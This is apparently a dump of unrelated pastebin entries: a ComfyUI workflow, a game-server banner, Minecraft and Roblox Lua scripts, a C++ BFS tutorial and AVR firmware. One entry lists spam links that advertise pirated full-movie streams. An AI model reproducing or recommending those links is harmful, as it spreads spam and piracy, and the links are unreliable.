          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""VAEDecode""
      }
    },
    {
      ""id"": 52,
      ""type"": ""CLIPTextEncode"",
      ""pos"": [
        322,
        -100
      ],
      ""size"": {
        ""0"": 400,
        ""1"": 200
      },
      ""flags"": {},
      ""order"": 6,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 115
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            128
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""CLIPTextEncode""
      },
      ""widgets_values"": [
        ""A person""
      ],
      ""color"": ""#232"",
      ""bgcolor"": ""#353""
    },
    {
      ""id"": 53,
      ""type"": ""CLIPTextEncode"",
      ""pos"": [
        319,
        145
      ],
      ""size"": {
        ""0"": 400,
        ""1"": 200
      },
      ""flags"": {},
      ""order"": 7,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 119
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            117
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""CLIPTextEncode""
      },
      ""widgets_values"": [
        ""text""
      ],
      ""color"": ""#322"",
      ""bgcolor"": ""#533""
    },
    {
      ""id"": 51,
      ""type"": ""KSampler"",
      ""pos"": [
        1055,
        238
      ],
      ""size"": {
        ""0"": 437.8135070800781,
        ""1"": 671.9424438476562
      },
      ""flags"": {},
      ""order"": 10,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""model"",
          ""type"": ""MODEL"",
          ""link"": 114
        },
        {
          ""name"": ""positive"",
          ""type"": ""CONDITIONING"",
          ""link"": 130
        },
        {
          ""name"": ""negative"",
          ""type"": ""CONDITIONING"",
          ""link"": 117
        },
        {
          ""name"": ""latent_image"",
          ""type"": ""LATENT"",
          ""link"": 139,
          ""slot_index"": 3
        }
      ],
      ""outputs"": [
        {
          ""name"": ""LATENT"",
          ""type"": ""LATENT"",
          ""links"": [
            125
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""KSampler""
      },
      ""widgets_values"": [
        1347568955296,
        ""randomize"",
        35,
        7,
        ""euler"",
        ""normal"",
        1
      ],
      ""color"": ""#223"",
      ""bgcolor"": ""#335""
    },
    {
      ""id"": 50,
      ""type"": ""CheckpointLoaderSimple"",
      ""pos"": [
        -120,
        29
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 98
      },
      ""flags"": {},
      ""order"": 1,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""MODEL"",
          ""type"": ""MODEL"",
          ""links"": [
            114
          ],
          ""shape"": 3,
          ""slot_index"": 0
        },
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": [
            115,
            119
          ],
          ""shape"": 3,
          ""slot_index"": 1
        },
        {
          ""name"": ""VAE"",
          ""type"": ""VAE"",
          ""links"": [
            121
          ],
          ""shape"": 3,
          ""slot_index"": 2
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""CheckpointLoaderSimple""
      },
      ""widgets_values"": [
        ""epicRealism_sd15.safetensors""
      ]
    },
    {
      ""id"": 32,
      ""type"": ""ControlNetApply"",
      ""pos"": [
        800,
        -270
      ],
      ""size"": {
        ""0"": 317.4000244140625,
        ""1"": 98
      },
      ""flags"": {},
      ""order"": 9,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""conditioning"",
          ""type"": ""CONDITIONING"",
          ""link"": 128
        },
        {
          ""name"": ""control_net"",
          ""type"": ""CONTROL_NET"",
          ""link"": 60,
          ""slot_index"": 1
        },
        {
          ""name"": ""image"",
          ""type"": ""IMAGE"",
          ""link"": 138
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            130
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""ControlNetApply""
      },
      ""widgets_values"": [
        1
      ]
    },
    {
      ""id"": 58,
      ""type"": ""EmptyLatentImage"",
      ""pos"": [
        515,
        409
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 106
      },
      ""flags"": {},
      ""order"": 2,
      ""mode"": 0,
      ""inputs"": [],
      ""outputs"": [
        {
          ""name"": ""LATENT"",
          ""type"": ""LATENT"",
          ""links"": [
            139
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""EmptyLatentImage""
      },
      ""widgets_values"": [
        512,
        512,
        1
      ]
    },
    {
      ""id"": 61,
      ""type"": ""Note"",
      ""pos"": [
        295,
        -521
      ],
      ""size"": [
        445.5208213771756,
        58.870972000683764
      ],
      ""flags"": {},
      ""order"": 3,
      ""mode"": 0,
      ""properties"": {
        ""text"": """"
      },
      ""widgets_values"": [
        ""You'll need the OpenPose controlnet selected here I use\n\""control_v11p_sd15_openpose_fp16.safetensors\""""
      ],
      ""color"": ""#432"",
      ""bgcolor"": ""#653""
    },
    {
      ""id"": 60,
      ""type"": ""LoadImage"",
      ""pos"": [
        -182,
        -351
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 102
      },
      ""flags"": {},
      ""order"": 4,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""links"": [
            138
          ],
          ""shape"": 3,
          ""slot_index"": 0
        },
        {
          ""name"": ""MASK"",
          ""type"": ""MASK"",
          ""links"": null,
          ""shape"": 3
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""LoadImage""
      },
      ""widgets_values"": [
        null,
        ""image""
      ]
    },
    {
      ""id"": 62,
      ""type"": ""Note"",
      ""pos"": [
        -172,
        -461
      ],
      ""size"": [
        301.7019565734173,
        64.23535472660637
      ],
      ""flags"": {},
      ""order"": 5,
      ""mode"": 0,
      ""properties"": {
        ""text"": """"
      },
      ""widgets_values"": [
        ""Load your open pose image here""
      ],
      ""color"": ""#432"",
      ""bgcolor"": ""#653""
    },
    {
      ""id"": 20,
      ""type"": ""SaveImage"",
      ""pos"": [
        1818,
        198
      ],
      ""size"": {
        ""0"": 821.7040405273438,
        ""1"": 834.4818115234375
      },
      ""flags"": {},
      ""order"": 12,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""images"",
          ""type"": ""IMAGE"",
          ""link"": 140,
          ""slot_index"": 0
        }
      ],
      ""properties"": {},
      ""widgets_values"": [
        ""OpenPose""
      ]
    },
    {
      ""id"": 54,
      ""type"": ""Reroute"",
      ""pos"": [
        1125,
        53
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 8,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 121
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""VAE"",
          ""links"": [
            126
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    }
  ],
  ""links"": [
    [
      60,
      34,
      0,
      32,
      1,
      ""CONTROL_NET""
    ],
    [
      114,
      50,
      0,
      51,
      0,
      ""MODEL""
    ],
    [
      115,
      50,
      1,
      52,
      0,
      ""CLIP""
    ],
    [
      117,
      53,
      0,
      51,
      2,
      ""CONDITIONING""
    ],
    [
      119,
      50,
      1,
      53,
      0,
      ""CLIP""
    ],
    [
      121,
      50,
      2,
      54,
      0,
      ""*""
    ],
    [
      125,
      51,
      0,
      55,
      0,
      ""LATENT""
    ],
    [
      126,
      54,
      0,
      55,
      1,
      ""VAE""
    ],
    [
      128,
      52,
      0,
      32,
      0,
      ""CONDITIONING""
    ],
    [
      130,
      32,
      0,
      51,
      1,
      ""CONDITIONING""
    ],
    [
      138,
      60,
      0,
      32,
      2,
      ""IMAGE""
    ],
    [
      139,
      58,
      0,
      51,
      3,
      ""LATENT""
    ],
    [
      140,
      55,
      0,
      20,
      0,
      ""IMAGE""
    ]
  ],
  ""groups"": [],
  ""config"": {},
  ""extra"": {},
  ""version"": 0.4
}"
PFDXEB7M,Azarus SCP:SL HRP #0,Bonjemus_YT,CSS,Sunday 19th of November 2023 09:59:21 AM CDT,"<align=center><size=35><b><color=#5534be>Bienvenue sur Azarus</color></b></size></align>
 
<color=#8f75e0>Des rôles, des objets et mêmes des SCP supplémentaires vous attendent !</color>

<size=17><color=#cc1f1f><b>3 règles simples à connaître :</color></b>
1. les insultes sont interdites.
2. La tricherie/utilisation d'exploit est interdite.
3. Les soundboards à caractère déplacées sont proscrites.
 
Pour nous rejoindre :</size>
<size=25>
> <link=""https://discord.gg/2rffSApHdD""><color=#795cd4><u>Discord</u></color></link> <size=13>(cliquez dessus)</size>
 
> <link=""https://www.patreon.com/FondationAzarus""><color=#fff984><u>Patreon</u></color></link></size> <size=13>(cliquez dessus)</size>
</size>
 
<color=#fff9ac>Pour en apprendre plus sur nos fonctionnalités uniques n’hésitez pas à poser vos questions sur le Discord ou directement en jeu (lorsque vous êtes spectateur par exemple).</color>
 
 
<b>Pour nous contacter :</b> <color=#795cd4>azarusscpsl@gmail.com</color>
<i>Ou passez par Discord : les MP des Fondateurs sont toujours ouverts.</i>"
Nz3UBth9,mekanismEnergyStorage,DafTag,Lua,Sunday 19th of November 2023 09:29:46 AM CDT,"local component = require(""component"")
local sides = require(""sides"")

-- Remplacez ces coordonnées par celles de votre bloc de stockage Mekanism
local mekanismStorage = component.proxy(component.list(""mekanism:creative_bin"")[1])

-- Fonction pour récupérer les informations du système de stockage Mekanism
function getMekanismStorageInfo()
    local info = {}

    -- Récupérer la capacité totale du stockage
    info.totalCapacity = mekanismStorage.getStorageSize()

    -- Récupérer l'espace actuellement utilisé dans le stockage
    info.usedCapacity = mekanismStorage.getStorageSize() - mekanismStorage.getStorageSpace()

    -- Récupérer une liste des articles stockés avec leurs quantités
    info.itemList = mekanismStorage.listAvailableItems()

    return info
end

-- Fonction pour afficher les informations
function printStorageInfo(info)
    print(""Capacité totale du stockage: "" .. info.totalCapacity .. "" items"")
    print(""Espace utilisé: "" .. info.usedCapacity .. "" items"")
    
    print(""\nListe des articles stockés:"")
    for item, quantity in pairs(info.itemList) do
        print(item .. "": "" .. quantity)
    end
end

-- Exécution du programme
local storageInfo = getMekanismStorageInfo()
printStorageInfo(storageInfo)"
uVGYNpn1,Untitled,Creadth,Lua,Sunday 19th of November 2023 09:23:00 AM CDT,"function redstonePulse(side)
    local status = redstone.getOutput(side);
    redstone.setOutput(side, not status);
	os.sleep(0.05);
    redstone.setOutput(side, status);
end

local readyChestSide = ""top"";
local beltInvertorSide = ""back"";
local seedInputSide = ""bottom"";

local grownCrystalName = ""appliedenergistics2:purified_certus_quartz_crystal"";

--local monitor = peripheral.wrap('right');
local belt = peripheral.wrap('right');
local items
--monitor.setCursorPos(1,1);
--monitor.setTextScale(0.5);
redstone.setOutput(beltInvertorSide, false)
--monitor.write('Detecting...');
redstone.setOutput(readyChestSide, true);
redstone.setOutput(seedInputSide, true);
local ticksWithoutItem = 0;
print('Detecting')
while true do
    items = belt.list();
    if #items > 0 then
        ticksWithoutItem = 0;
        --monitor.clear();
        local item = belt.getItemDetail(1);
        if (item.name ~= grownCrystalName) then
            print(""Crystal is not ready, another iteration"");
            redstone.setOutput(beltInvertorSide, true);
            os.sleep(4);
            redstone.setOutput(beltInvertorSide, false)
        else
            print(""Crystal is ready!"");
            redstonePulse(readyChestSide);
            redstonePulse(seedInputSide);
        end
    else
        ticksWithoutItem=ticksWithoutItem+1;
        if (ticksWithoutItem > 600) then
            print(""No items detected on the belt for 600 ticks, requesting another item"");
            redstonePulse(seedInputSide);
            ticksWithoutItem = 0;
        end
    end
    os.sleep(0.1);
end"
TdHzstKi,esghseh,gadungw71,PHP,Sunday 19th of November 2023 08:48:58 AM CDT,"https://gamma.app/public/-HD-The-Undertaker-HD-1080p-zm2wwhnkmp3mbsm
https://www.taskade.com/p/2023-the-undertaker-hd-01HFK7KBMFQN5485M6S2VFA3YD
https://player.soundon.fm/p/0cad59d7-4b87-42ed-9c66-2745237122c6
https://gamma.app/public/-The-Undertaker-2023-HD-HD1080p-657u0phpdx5uvtv
https://www.taskade.com/p/the-undertaker-2023-1080p-01HFK8EMDX9004DPQV93TJ3V9P
https://player.soundon.fm/p/bf768cec-7f2c-4273-9e01-79aa70d0a2fb
https://gamma.app/public/-The-Undertaker-2023-Full-HD--on5rajni64dxfv9
https://www.taskade.com/p/the-undertaker-2023-1080-hd-thai-01HFK96RZAFXVSW52KM2N03KCC
https://gamma.app/public/-2023-Full-HD-SUB-THAI----as8o4plp4i6ss5u
https://www.taskade.com/p/hd-thai-sub-01HFK9ZG7J63203W0XAX4PBFFV
https://player.soundon.fm/p/6ce0e4ec-8744-4911-a768-3ddc679e4475
https://gamma.app/public/--HD-SUB-THAI-xr3g2veetxpdmma
https://www.taskade.com/p/2023-full-hd-01HFKAVHBT71AG1HZBQPKZ7TZ6
https://player.soundon.fm/p/a388f8c8-16ff-41a6-b4bb-caf27d6e14e8
https://gamma.app/public/Gamma-Tips-Tricks-pneyoh32oqmgi8l
https://www.taskade.com/p/2023-1080p-01HFKBT66FSRWJ1RRH4RREYWWN
https://gamma.app/public/-Tee-Yod-2023-4K-THAI-o1ivs8pd81rfuwr
https://www.taskade.com/p/tee-yod-hd-1080p-01HFKEED59SH2ZZSS1TKAFYB26
https://gamma.app/public/Izle-Ataturk-1881---1919-1-Film-Filmi-Full-2023-Ataturk-1881---19-dh60qywjy8juz82
https://www.taskade.com/p/izle-atatuerk-filmleri-1881-1919-1-film-full-filmler-online-hd-1080-p-01HFKVQ7PNKE99ZDFN0DBA3V66
https://gamma.app/public/Filmi-Tam-Surum-Ataturk-1881---1919-1-Film-2023-Turkce-altyazl-Iz-4tyzfnn7t128lmr
https://www.taskade.com/p/izle-filmi-atatuerk-1881-1919-2-film-tam-sueruem-tuerkce-dublaj-izle-mp-4-720p-1080p-01HFKZ4AJV7ZEEP38F4F00QMAZ
https://www.taskade.com/p/film-izle-atatuerk-1881-1919-1-film-2023-full-hd-1080p-tuerkce-dublaj-01HFKZD24G3BYJT1JVHD4PWRSG
https://gamma.app/public/Izle-Ataturk-1881---1919-1-Film-Full-Online-izle-HD-Turkce-iph01blwjo8gj2c"
cKuSFmGN,Untitled,maksincolf,C++,Sunday 19th of November 2023 08:21:35 AM CDT,"#include <bits/stdc++.h>

using namespace std;

// здесь я рассмотрю одну из классических задач, которые обычно классифицируют как ""путник в лабиринте""
// суть их обычно состоит в том, что нужно найти кратчайший путь между какими-то точками или что-то в таком духе
// задачу ниже я придумал только что.

// Задача: есть какой-то лабиринт n*m, где проход обозначается '.', а стена '#'.
// Выход помечен символом 'E' и имеет координаты x0, y0, в клетке x1, y1 стоит путник (клетка с символом 'P').
// Путник может ходить только в смежные клетки (то есть вверх, вниз, вправо, влево).
// Вопрос: за какое минимальное количество ходов путник выберется из лабиринта? (вывести -1, если невозможно)

/* Пример 1:
Входные данные:
6 8
6 5 2 4
.#....#.
.#.P#.#.
.####...
.......#
...###..
....E#..
Выходные:
13

Пример 2
 Входные данные:
6 8
6 5 2 4
.#....#.
.#.P#.#.
.#####..
.......#
...###..
....E#..
Выходные:
-1
 */

// смещения индексов по x и по y
// если просмотреть их в порядке, в котором они сейчас записаны то это будет так:
// вниз, вправо, вверх, влево
const int dx[4] = {1, 0, -1,  0};
const int dy[4] = {0, 1,  0, -1};

// пример смещений для коня на шахматной доске:
/*
const int dx[8] = {1, 2, 2,  1, -1, -2, -2, -1};
const int dy[8] = {2, 1,-1, -2, -2, -1,  1,  2};
 */

int main(){
    int n, m, x0, y0, x1, y1;
    cin >> n >> m >> x0 >> y0 >> x1 >> y1;

    x0--, y0--, x1--, y1--; // переводим в 0-индексацию
    // замечание: в некоторых задачах вам не могут явно дать нужные позиции (как здесь, например, путника и выхода),
    // но точно так же могут обозначить символами на карте, в таком случае нужно самим пройтись по полю и вычленить эти координаты

    vector<string> field(n);
    for (int i = 0; i < n; i++) {
        cin >> field[i];
    }

    // здесь мы в каждой клетке храним true, если мы уже были в этой клетке и нам больше нет смысла туда идти,
    // и false, если мы так до сих пор не были
    vector<vector<bool>> used(n, vector<bool>(m));

    // в нашей очереди первым числом будем хранить координату x, второй - y, а третьим числом - текущее количество ходов
    queue<int> q;
    // пушим текущую клетку
    q.push(x1);
    q.push(y1);
    q.push(0); // мы не сделали пока ходов, поэтому 0

    while(!q.empty()) {
        // достаём все наши индексы
        int x = q.front();
        q.pop();
        int y = q.front();
        q.pop();
        int z = q.front();
        q.pop();

        if (x == x0 && y == y0) { // добрались до выхода
            cout << z;
            return 0;
        }
        for (int i = 0; i < 4; i++) { // проходим по всем нашим смещениям
            int nx = x + dx[i], ny = y + dy[i]; // новые координаты, куда мы хотим пойти
            if (nx >= 0 && nx < n && ny >= 0 && ny < m) { // проверяем, не вышли ли мы за пределы поля
                if ((field[nx][ny] == '.' || field[nx][ny] == 'E') && !used[nx][ny]) { // проверяем, можем ли мы пойти в эту клетку И не были ли мы в ней уже до этого.
                    // Всё отлично, мы здесь не были и можем в неё зайти.
                    q.push(nx);
                    q.push(ny);
                    q.push(z + 1);
                    used[nx][ny] = true; // помечаем, что мы уже здесь были
                }
            }
        }
    }

    // мы не смогли найти выход (((
    cout << -1;

    return 0;
}"
vyNY61Ce,firmware prototype for memory check,anticlown,C,Sunday 19th of November 2023 07:54:23 AM CDT,"#include <mega328p.h>
#include <delay.h>

#define E PORTB.4
#define D PORTC.5
#define W PORTD.4
#define Q PORTD.5
#define A5 PORTC.0
#define A6 PORTC.1
#define A9 PORTC.2
#define A8 PORTC.3
#define A7 PORTC.4
#define A0 PORTB.3
#define A1 PORTB.2
#define A2 PORTB.1
#define A3 PORTB.0
#define A10 PORTD.7
#define A11 PORTD.6
#define A4  PORTB.5

#define ACmp(Value) if(Value != 0){\
    Value = 1;\
}

#define A(offset) A0 = offset & 0b00000000000000000000000000000001; ACmp(A0); \
   A1 = offset & 0b00000000000000000000000000000010; ACmp(A1); \
    A2 = offset & 0b00000000000000000000000000000100; ACmp(A2); \
    A3 = offset & 0b00000000000000000000000000001000; ACmp(A3); \
    A4 = offset & 0b00000000000000000000000000010000; ACmp(A4); \
    A5 = offset & 0b00000000000000000000000000100000; ACmp(A5); \
    A6 = offset & 0b00000000000000000000000001000000; ACmp(A6); \
    A7 = offset & 0b00000000000000000000000010000000; ACmp(A7); \
    A8 = offset & 0b00000000000000000000000100000000; ACmp(A8); \
    A9 = offset & 0b00000000000000000000001000000000; ACmp(A9); \
   A10 = offset & 0b00000000000000000000010000000000; ACmp(A10); \
   A11 = offset & 0b00000000000000000000100000000000; ACmp(A11); 

//Запись в память с offset = diapasonStart по offset = diapasonEnd значения = Value
void writeCycle(unsigned value, unsigned diapasonStart, unsigned diapasonEnd) {

    unsigned dataOffset = diapasonStart;
    diapasonEnd++; //Чтобы функция соответствовала требованиям (while проходил весь диапазон)
    D = value;
    E = 0;                                  
    
    while (dataOffset < diapasonEnd) {

        E = 1;
        W = 0;
        A(dataOffset)

            W = 1;
        delay_ms(20);

        W = 0;
        delay_ms(20);

        dataOffset++;
        E = 0;
    }

}

void DelayCheck(int* i) {
    *i = *i ^ 1;
    PORTC.0 = *i;
    delay_ms(200);
}

unsigned checkIsCorrect(unsigned value, unsigned diapasonStart, unsigned diapasonEnd) { // все значения равны заданному value
    unsigned dataOffset = diapasonStart;
    diapasonEnd++;
    E = 0;
    W = 0;

    while (dataOffset < diapasonEnd) {
        E = 1;
        A(dataOffset)
        
        delay_ms(20);

        if (Q != value)
            return 1;
        
        E = 0;
        dataOffset++;
    }
    return 0;
}

void main(void) {
    //writeCycle(1, 0, 4095);
    //unsigned ans = checkIsCorrect(1, 0, 4095);
    int i = 0;
    while (1) {
        i = i ^ 1;    
        delay_ms(20);
        E = i; 
    }
}"
vS5tXETe,Script for HD,jcnruad900,Lua,Sunday 19th of November 2023 07:51:10 AM CDT,"--//Services\\

local serverStorage = game:GetService(""ServerStorage"")

local replicatedStorage = game:GetService(""ReplicatedStorage"")

local collectionService = game:GetService(""CollectionService"")

--//Variables\\

local resources = serverStorage:WaitForChild(""Resources"")

local spawnedResources = workspace.SpawnedResources

local cleanupFunctions : {[Instance] : () -> ()} = {}

local currentResources : {[BasePart] : {Model|BasePart}} = {}

local resourceCheckParams = OverlapParams.new()
resourceCheckParams.FilterType = Enum.RaycastFilterType.Include
resourceCheckParams.FilterDescendantsInstances = {spawnedResources}

--//Settings\\

local difficultyBaseValue = 5

local groundTypes : {[string] : {spawnTime : {number}, resourceTypes : {string}}} = {
	[""Default""] = {
		spawnTime = {0.5, 0.6},
		resourceTypes = {""Tree"", ""Meteorite""},
		resourceLimit = 50
	}
}

local resourceTypes : {
	[string] : {model : Model, seed : {number}?, difficultyMultiplier : number?}
} = {
	[""Tree""] = {
		model = resources.Tree,--What model to pivot to specified location
		difficultyMultiplier = 0.125,
		seed = {1, 999}--Min seed, Max seed
	},
	[""Meteorite""] = {
		model = resources.Meteorite,
		difficultyMultiplier = 0.25,
		seed = {1, 999}
	},
}

--//Setup\\

local seed = math.random() --GET A SEED FOR RESOURCE GENERATION

--//Functions\\

local function randomElement(array : {any})
	return #array == 1 and array[1] or #array > 1 and array[math.random(1, #array)] or nil--if element count is 1 return first element if element count is bigger than 1 return random element otherwise return nil
end

local function removeGround(resourceGround : BasePart)
	if cleanupFunctions[resourceGround] then
		cleanupFunctions[resourceGround]()--Call cleanup function
		
		cleanupFunctions[resourceGround] = nil--Clear the cleanup function
	end
end

local function plrCharacterValid(player : Player) : boolean
	return player.Character and player.Character:FindFirstChild(""Humanoid"")
		and (player.Character :: Model&{Humanoid : Humanoid}).Humanoid.Health > 0
end--Make sure player has character, humanoid and that he has more than 0 health, 
--the weird gibberish in the middle of the condition is to silence the idiot typechecking

local function returnFurthestRange(object : Model|BasePart) : number
	local size = object:IsA(""BasePart"") and object.Size or (object :: Model):GetExtentsSize()
	--If object is a model then get its extents size, if it's a part then get its size
	
	return math.sqrt((size.X/2)^2 + (size.Z/2)^2)-- return the hypotenuse of the two dimensions halved
	--which will be equal in length to the distance between the corner and the center of the model
end

local function spawnLootTable(pos : Vector3, tableId : string)
	replicatedStorage.SpawnLootTable:Fire(tableId, pos)--Call the loot handling script to spawn loot
end

local function setupResource(resource : (Model|BasePart)&{ResourceGround : ObjectValue})--Setup resource to be handled with proximity prompts 
	local resourceData = resourceTypes[resource.Name]
	
	local proximityPrompt = Instance.new(""ProximityPrompt"")
	proximityPrompt.RequiresLineOfSight = true
	proximityPrompt.ObjectText = resource.Name
	proximityPrompt.ActionText = ""Harvest""
	proximityPrompt.MaxActivationDistance = returnFurthestRange(resource) + 5
	proximityPrompt.HoldDuration = (resourceData.difficultyMultiplier or 1) * difficultyBaseValue
	--The more difficult == The longer it takes to harvest
	proximityPrompt.Parent = resource--Create proximity prompt and parent it after giving properties
	
	proximityPrompt.Triggered:Connect(function(plr)
		if plrCharacterValid(plr) then
			spawnLootTable(resource:GetPivot().Position, resource.Name)
			
			resource:Destroy()
		end
	end)--Bind event and handle player interactions
end

local function getSpawnCFrame(resourceGround : BasePart, resourceSize : Vector3?, seedOverride : number?) : CFrame
	local seed = seedOverride or seed
	local resourceSize = resourceSize or Vector3.new()
	local noiseIndex = #currentResources[resourceGround]
	
	local cf = CFrame.new(
		(resourceGround.Size.X - resourceSize.X) * math.clamp(math.noise(noiseIndex, math.sin(noiseIndex), seed), -0.5, 0.5), 
		resourceGround.Size.Y/2,
		(resourceGround.Size.Z - resourceSize.Z) * math.clamp(math.noise(noiseIndex, math.cos(noiseIndex), seed), -0.5, 0.5)
	)--Get the X and Z position by substracting to the ground size the resource size and multiplying by clamped noise between -0.5, 0.5
	
	cf = resourceGround.CFrame:ToWorldSpace(cf)
	
	if #workspace:GetPartBoundsInBox(cf, resourceSize, resourceCheckParams) > 0 then--Check for other resource obstructions in selected cframe
		return getSpawnCFrame(resourceGround, resourceSize, seed + 0.1)-- If an obstruction is found then vary seed slightly and do a recursive function call to retry
	end
	
	return cf--Return the world cframe from the offset calculated above
end

local function setupGround(resourceGround : BasePart)
	removeGround(resourceGround)--If for some reason cleanup wasn't called last time then call it now to avoid memory leaks
	
	local groundSettings = groundTypes[resourceGround.Name or ""Default""]
	local loopTask
	
	cleanupFunctions[resourceGround] = function()--Setup a function that upon being called cleanups the thread
		if loopTask then
			task.cancel(loopTask)--If the task wasn't canceled already then cancel it
		end
	end
	
	local function spawnResource()
		local resourceId = randomElement(groundSettings.resourceTypes)--Simple return function that gets a random element
				
		if resourceId then -- if array contained at least one resoure type then spawn it and trigger with the Resource tag the client script that handles animations
			local resourceData = resourceTypes[resourceId]
			local resource = resourceData.model:Clone()

			resource:AddTag(""Resource"")
			
			local spawnCF = getSpawnCFrame(resourceGround, resource:IsA(""BasePart"") and resource.Size or resource:GetExtentsSize())
			
			resource:PivotTo(spawnCF)
			
			local resourceGroundReference = Instance.new(""ObjectValue"")
			resourceGroundReference.Name = ""ResourceGround""
			resourceGroundReference.Value = resourceGround
			resourceGroundReference.Parent = resource
			
			resource.Parent = spawnedResources--Parent it to folder in workspace after assigning properties

			table.insert(currentResources[resourceGround], resource)--Register resource in dict as spawned inside of resourceGround
		end
	end
	
	currentResources[resourceGround] = {}
		
	loopTask = task.spawn(function() --Split thread and create a new task, save task inside of an handy variable
		while true do--Wait a random amount of time between min and max, es: 10 + (20 - 10) * %R% where %R% is a float between 0 and 1
			wait(groundSettings.spawnTime[1] + (groundSettings.spawnTime[2] - groundSettings.spawnTime[1]) * math.random())
			
			if #currentResources[resourceGround] < (groundSettings.resourceLimit or 50) then
				spawnResource()--Call the spawn function
			end
		end
	end)
end

--//Setup\\

for _, resourceGround in pairs(collectionService:GetTagged(""ResourceGround"")) do
	setupGround(resourceGround)
end--Setup current existing grounds for resources to spawn

for _, resource in pairs(collectionService:GetTagged(""Resource"")) do
	setupResource(resource)
end--Setup current existing resources

--//Events\\

collectionService:GetInstanceRemovedSignal(""Resource""):Connect(function(resource)
	if resource:FindFirstChild(""ResourceGround"") then
		local groundResources = currentResources[resource.ResourceGround.Value]
		local i = table.find(groundResources, resource)

		if i then
			table.remove(groundResources, i)
		end
	end
end)

collectionService:GetInstanceAddedSignal(""Resource""):Connect(setupResource)

--Handle new spawned resources with setup function

collectionService:GetInstanceRemovedSignal(""ResourceGround""):Connect(removeGround)
collectionService:GetInstanceAddedSignal(""ResourceGround""):Connect(setupGround)--Allow new grounds to be added through scripts or clonation

---------------------------------------------------------------------------------------------------------------
--From this point onward it would be another script or module but for ease of showing and linking it in the pastebin
--I made it in the same script

--LOOT HANDLER

--//Variables\\

local items = serverStorage:WaitForChild(""Items"")

local spawnedItems = workspace.SpawnedItems

--//Settings\\

export type item = string
export type spawnedItem = {item : item, quantity : number}

export type lootEntry = {item : item, chance : number?, minQuantity : number?, maxQuantity : number?, entryGroup : string?}
--LOOT ENTRIES WITH SAME ENTRY GROUP will work on an exclusive logic, es: if entry group A has 3 items having the following rarities: 
-- 20%, 20%, 60% then, there will be a 20% chance to get the first item, another 20% chance to get the second and a 60% chance to get the third 
--but only one can be gotten
--If a loot entry gets chosen for being spawned then a random quantity between min and max will be spawned

local lootTables : {
	[string] : {lootEntry}
} = {
	[""Meteorite""] = {
		{
			item = ""Strange Artifact"",
			chance = 0.1,
			minQuantity = 1
		},
		{
			item = ""Meteorite Piece"",
			chance = 1,
			minQuantity = 1,
			maxQuantity = 4,
		},
	},
	[""Tree""] = {
		{
			item = ""Apple"",
			chance = 0.2,
			minQuantity = 1
		},
		{
			item = ""Leaf"",
			chance = 1,
			minQuantity = 3,
			maxQuantity = 4,
		},
		{
			item = ""Log"",
			chance = 1,
			minQuantity = 1,
		},
		{
			item = ""Log"",
			chance = 0.5,
			minQuantity = 1,
			entryGroup = ""A""
		},
		{
			item = ""Leaf"",
			chance = 0.5,
			minQuantity = 3,
			entryGroup = ""A""
		},
	},
}

--//Functions\\

local function insertLootEntry(spawnedItems : {spawnedItem}, lootEntry : lootEntry)
	local min = lootEntry.minQuantity or 1
	local max = lootEntry.maxQuantity or min or 1

	table.insert(spawnedItems, {item = lootEntry.item, 
		quantity = min + math.round((max - min) * math.random())
	})-- do some math to get quantity without having to check if interval is 0
end

local function spawnItem(item : string, pos : Vector3)
	local model = items:FindFirstChild(item)
	
	if model then
		model = model:Clone()
		model:PivotTo(CFrame.new(pos))--Pivot to new cframe from position
		model.Parent = spawnedItems--Spawn an already welded item
		--Not going to weld items as it would really depend heavily on what items we're dealing with and the type of game, I am keeping it shrimple
	end
end

local function calculateLootSpawn(lootTable : {lootEntry}) : {spawnedItem}
	local spawnedItems = {}-- array of items to spawn 
	local entryGroups = {}--dictionary of groups to lootentry array used in advanced percentage calculation
	
	for _, lootEntry in pairs(lootTable) do
		if lootEntry.chance then
			if lootEntry.entryGroup then-- if there's a chance defined and an entry group then add this entry to the entry group dict
				if not entryGroups[lootEntry.entryGroup] then
					entryGroups[lootEntry.entryGroup] = {}--if no array was defined for this entry group then define it
				end
				
				table.insert(entryGroups[lootEntry.entryGroup], lootEntry)-- insert entry in entry group array
				
				continue--skip cycle
			end
			--if only chance was declared then check if chance is lower than a random number between 0 and 1
			if lootEntry.chance < math.random() then
				continue--if not skip cycle
			end
		end
		
		--all checks above passed, either no chance was defined or the chance was high enough
		
